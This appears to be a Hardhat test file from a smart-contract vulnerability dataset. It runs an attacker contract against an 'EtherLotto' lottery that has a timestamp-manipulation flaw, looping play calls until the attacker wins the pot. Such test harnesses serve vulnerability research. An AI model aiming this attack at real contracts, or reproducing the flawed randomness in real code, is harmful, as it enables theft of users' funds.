const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack time_manipulation/ether_lotto.sol', function () {
    let owner, sig1;
    async function deployContracts() {
        [owner, sig1] = await ethers.getSigners();

        const EtherLotto = await ethers.getContractFactory('contracts/dataset/time_manipulation/ether_lotto.sol:EtherLotto');
        const victim = await EtherLotto.connect(owner).deploy();

        const EtherLottoAttacker = await ethers.getContractFactory('contracts/time_manipulation/ether_lotto_attack.sol:EtherLottoAttacker');
        const attacker = await EtherLottoAttacker.deploy(victim.target);
        await attacker.waitForDeployment();

    return {victim, attacker};
    }

  
    it('exploit time manipulation vulnerability', async function () {
        const {victim, attacker} = await loadFixture(deployContracts);

        const victimBalanceBefore = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceBefore).to.equal(0);

        const attackerBalanceBefore = await ethers.provider.getBalance(attacker.target);
        expect(attackerBalanceBefore).to.equal(0);

        const sigBalance = await ethers.provider.getBalance(sig1.address);
        const tx = await victim.connect(sig1).play({value: 10});
        const receipt = await tx.wait();
        const sigBalanceAfter = await ethers.provider.getBalance(sig1.address);
        const net = sigBalanceAfter - sigBalance + receipt.gasUsed * receipt.gasPrice;

        let attackerBalance = attackerBalanceBefore;

        while (attackerBalance == 0) {
            await attacker.play({value: 10});
            attackerBalance = await ethers.provider.getBalance(attacker.target);
        }
        if (net == -10n) {
            expect(attackerBalance).to.equal(19);
        }
        else {
            expect(attackerBalance).to.equal(9);
        }

    });
  });